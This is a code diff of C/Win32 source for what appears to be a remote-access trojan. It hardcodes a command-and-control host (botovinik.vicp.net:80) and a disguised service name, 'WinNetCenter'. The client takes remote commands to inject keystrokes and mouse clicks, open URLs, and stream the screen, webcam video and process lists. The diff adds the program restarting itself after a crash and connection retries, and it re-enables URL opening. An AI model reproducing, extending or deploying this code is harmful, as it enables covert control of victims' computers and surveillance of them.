@@ -35,7 +35,7 @@ struct MODIFY_DATA
 }modify_data =
 {
     "botovinik.vicp.net:80",
-    "141111",
+    "150614",
 	vipid,
 	FALSE,
     "WinNetCenter",
@@ -49,25 +49,25 @@ SOCKET MainSocket;
 
 inline unsigned long _stdcall resolve(char *host)
 {
-    struct hostent *ser=NULL;
+    struct hostent *ser = NULL;
 
-	long i=inet_addr(host);
+	long i = inet_addr(host);
 	
     if (i < 0)
     {
-        if ((ser = (struct hostent*)gethostbyname(host)) != NULL)
+		ser = (struct hostent*)gethostbyname(host);
+
+        if (ser == NULL)
+        {
+        	ser = (struct hostent*)gethostbyname(host); //retry
+        }
+		
+		if (ser != NULL)
         {
         	return (*(unsigned long *)ser->h_addr);
         }
-		else
-		{
-			if ((ser = (struct hostent*)gethostbyname(host)) != NULL)
-        	{
-        		return (*(unsigned long *)ser->h_addr);
-        	}
-        	
-        	return 0;
-		}            
+		
+		return 0;  
     }
 
     return i;
@@ -82,19 +82,22 @@ DWORD _stdcall ConnectThread(LPVOID lParam)
     LocalAddr.sin_port = htons(modify_data.ServerPort);
     LocalAddr.sin_addr.S_un.S_addr = resolve(modify_data.ServerAddr);
 
-    MainSocket = socket(AF_INET, SOCK_STREAM, 0);	//连接的socket
+    MainSocket = socket(AF_INET, SOCK_STREAM, 0); //连接的socket
 	
 	int timeout = 45000;
-	int err = setsockopt(MainSocket,SOL_SOCKET,SO_RCVTIMEO, (char *)&timeout,sizeof(timeout));
+	int err = setsockopt(MainSocket, SOL_SOCKET, SO_RCVTIMEO, (char *)&timeout, sizeof(timeout));
   		
     if (connect(MainSocket,(PSOCKADDR)&LocalAddr, sizeof(LocalAddr)) == SOCKET_ERROR)
     {
         MsgErr("Can't Connect");
+#ifndef DE
+		Sleep(30000);
+#endif
         return 0;//connect error
     }
     else
     {
-        TurnonKeepAlive(MainSocket, 75);
+        TurnonKeepAlive(MainSocket, 120);
     }
 
     SysInfo m_SysInfo;
@@ -122,7 +125,7 @@ DWORD _stdcall ConnectThread(LPVOID lParam)
 
     while (1)	//接收命令
     {
-        if (! RecvMsg(MainSocket, (char *)chBuffer, &msgHead))	//掉线，错误
+        if ( !RecvMsg(MainSocket, (char *)chBuffer, &msgHead))	//掉线，错误
         {
             MsgErr("Can't Recv");
             shutdown(MainSocket, 0x02);
@@ -225,7 +228,7 @@ DWORD _stdcall ConnectThread(LPVOID lParam)
 				char strUrl[256];
 				memset(strUrl, 0, 256);
 				lstrcpyn(strUrl, chBuffer, msgHead.dwSize);
-				//OpenUrl(strUrl);
+				OpenUrl(strUrl);
 #endif
 			}
 			break;
@@ -239,7 +242,7 @@ DWORD _stdcall ConnectThread(LPVOID lParam)
 
 			case CMD_KEYDOWN:	//WM_KEYDOWN
 			{
-			    XScreenXor OpenDesktop;
+			    //OpenUserDesktop();
 			    int nVirtKey = msgHead.dwExtend1;
 			    keybd_event((BYTE)nVirtKey,0,0,0);
 			}
@@ -247,7 +250,7 @@ DWORD _stdcall ConnectThread(LPVOID lParam)
 
 			case CMD_KEYUP:	//WM_KEYUP
 			{
-			    XScreenXor OpenDesktop;
+			    //OpenUserDesktop();
 				int nVirtKey = msgHead.dwExtend1;
 			    keybd_event((BYTE)nVirtKey, 0, KEYEVENTF_KEYUP, 0);
 			}
@@ -255,7 +258,7 @@ DWORD _stdcall ConnectThread(LPVOID lParam)
 
 			case CMD_MOUSEMOVE:	//WM_MOUSEMOVE
 			{
-			    XScreenXor OpenDesktop;
+			    //OpenUserDesktop();
 			    POINT pt;
 			    pt.x = msgHead.dwExtend1;
 			    pt.y = msgHead.dwExtend2;
@@ -265,21 +268,21 @@ DWORD _stdcall ConnectThread(LPVOID lParam)
 
 			case CMD_LBUTTONDOWN:	//WM_LBUTTONDOWN
 			{
-				XScreenXor OpenDesktop;
+				//OpenUserDesktop();
 	            mouse_event(MOUSEEVENTF_LEFTDOWN, 0, 0, 0, 0);
 		    }
 			break;
 
 	        case CMD_LBUTTONUP:	//WM_LBUTTONUP
 		    {
-			    XScreenXor OpenDesktop;
+			    //OpenUserDesktop();
 				mouse_event(MOUSEEVENTF_LEFTUP, 0, 0, 0, 0);
 	        }
 		    break;
 
 			case CMD_LBUTTONDBLCLK:	//WM_LBUTTONDBLCLK
 	        {
-		        XScreenXor OpenDesktop;
+		        //OpenUserDesktop();
 			    mouse_event(MOUSEEVENTF_LEFTDOWN,0,0,0,0);
 				mouse_event(MOUSEEVENTF_LEFTUP,0,0,0,0);
 	            mouse_event(MOUSEEVENTF_LEFTDOWN,0,0,0,0);
@@ -289,21 +292,21 @@ DWORD _stdcall ConnectThread(LPVOID lParam)
 
 		    case CMD_RBUTTONDOWN:	//WM_RBUTTONDOWN
 			{
-				XScreenXor OpenDesktop;
+				//OpenUserDesktop();
 	            mouse_event(MOUSEEVENTF_RIGHTDOWN, 0, 0, 0, 0);
 		    }
 			break;
 
 	        case CMD_RBUTTONUP:	//WM_RBUTTONUP
 		    {
-			    XScreenXor OpenDesktop;
+			    //OpenUserDesktop();
 				mouse_event(MOUSEEVENTF_RIGHTUP,0,0,0,0);
 	        }
 		    break;
 
 			case CMD_RBUTTONDBLCLK:	//WM_RBUTTONDBLCLK
 	        {
-		        XScreenXor OpenDesktop;
+		        //OpenUserDesktop();
 			    mouse_event(MOUSEEVENTF_RIGHTDOWN,0,0,0,0);
 				mouse_event(MOUSEEVENTF_RIGHTUP,0,0,0,0);
 				mouse_event(MOUSEEVENTF_RIGHTDOWN,0,0,0,0);
@@ -454,10 +457,10 @@ DWORD _stdcall ScreenThread(LPVOID lParam)
     {
         //设置发送缓冲区,有利于屏幕传输
         int rcvbuf = 65536; //64KB
-        int rcvbufsize=sizeof(int);
+        int rcvbufsize = sizeof(int);
         setsockopt(ScreenSocket, SOL_SOCKET,SO_SNDBUF, (char*)&rcvbuf, rcvbufsize);
         int bNodelay = 1;
-        setsockopt(ScreenSocket,IPPROTO_TCP,TCP_NODELAY,(char*)&bNodelay,sizeof(bNodelay));//不采用延时算法   
+        setsockopt(ScreenSocket, IPPROTO_TCP, TCP_NODELAY, (char*)&bNodelay, sizeof(bNodelay));//不采用延时算法   
     }
 
     //稍微降低进程优先级
@@ -523,7 +526,7 @@ DWORD _stdcall ScreenThread(LPVOID lParam)
 
 	///////////////////////////////next//////////////////////////////
 
-    while ( bNotStop )
+    while (bNotStop)
     {
         dwLastSend = GetTickCount();
 
@@ -546,7 +549,7 @@ DWORD _stdcall ScreenThread(LPVOID lParam)
             Sleep(100);
     }
 
-    //释放掉掉分配的内存，句柄等等
+    //Release Mem and Handle
 	shutdown(ScreenSocket,0);
     closesocket(ScreenSocket);
     delete [] pDataCompress;
@@ -562,7 +565,6 @@ DWORD _stdcall VideoThread(LPVOID lParam)
     LocalAddr.sin_port=htons(modify_data.ServerPort);
     LocalAddr.sin_addr.S_un.S_addr=resolve(modify_data.ServerAddr);
 
-    //视频捕捉的socket
     SOCKET VideoSocket = socket(AF_INET, SOCK_STREAM, 0);
     if (connect(VideoSocket,(PSOCKADDR)&LocalAddr,sizeof(LocalAddr)) == SOCKET_ERROR)
     {
@@ -572,10 +574,10 @@ DWORD _stdcall VideoThread(LPVOID lParam)
     {
         //设置发送缓冲区,有利于视频传输
         int rcvbuf = 65536; //64KB
-        int rcvbufsize=sizeof(int);
-        setsockopt(VideoSocket,SOL_SOCKET,SO_SNDBUF,(char*)&rcvbuf,rcvbufsize);
+        int rcvbufsize = sizeof(int);
+        setsockopt(VideoSocket, SOL_SOCKET, SO_SNDBUF, (char*)&rcvbuf, rcvbufsize);
         int bNodelay = 1;
-        setsockopt(VideoSocket,IPPROTO_TCP,TCP_NODELAY,(char*)&bNodelay,sizeof(bNodelay));//不采用延时算法   
+        setsockopt(VideoSocket, IPPROTO_TCP, TCP_NODELAY, (char*)&bNodelay, sizeof(bNodelay));//不采用延时算法   
     }
 
     //==================================================================
@@ -675,7 +677,7 @@ DWORD _stdcall ProcessThread(LPVOID lParam)
 
     //================================================================================
     MsgHead msgHead;
-    char    chBuffer[32 * 1024]; //数据交换区
+    char chBuffer[32 * 1024]; //数据交换区
 
     //send socket type
     msgHead.dwCmd = SOCKET_PROCESS;
@@ -947,12 +949,12 @@ DWORD _stdcall FileUpThread(LPVOID lParam)
 
 LONG _stdcall Errdo(_EXCEPTION_POINTERS *ExceptionInfo)
 {
-	while(1)
-	{
-		ConnectThread(NULL);
-	}
+	char SelfPath[128];
+	GetModuleFileName(GetModuleHandle(NULL), SelfPath, 128);
+	WinExec(SelfPath, 0);
 
-	return EXCEPTION_CONTINUE_EXECUTION;
+	//return EXCEPTION_CONTINUE_EXECUTION;
+	return EXCEPTION_EXECUTE_HANDLER;
 }
 
 int WINAPI WinMain(HINSTANCE hInstance,
@@ -960,6 +962,8 @@ int WINAPI WinMain(HINSTANCE hInstance,
                    LPSTR     lpCmdLine,
                    int       nCmdShow)
 {
+	OpenUserDesktop();
+
 #ifdef Lxform
     HWND hwnd = CreateWindowExW(
     			   WS_EX_APPWINDOW,
@@ -996,8 +1000,8 @@ int WINAPI WinMain(HINSTANCE hInstance,
 OK:
 #endif
 
-	modify_data.ServerPort=80;
-	lstrcpy(modify_data.ServerAddr,"127.0.0.1");	//192.168.1.145
+	modify_data.ServerPort = 80;
+	lstrcpy(modify_data.ServerAddr, "127.0.0.1");	//192.168.1.145
 	
 	SetThreadPriority( GetCurrentThread(), THREAD_PRIORITY_BELOW_NORMAL );
 	
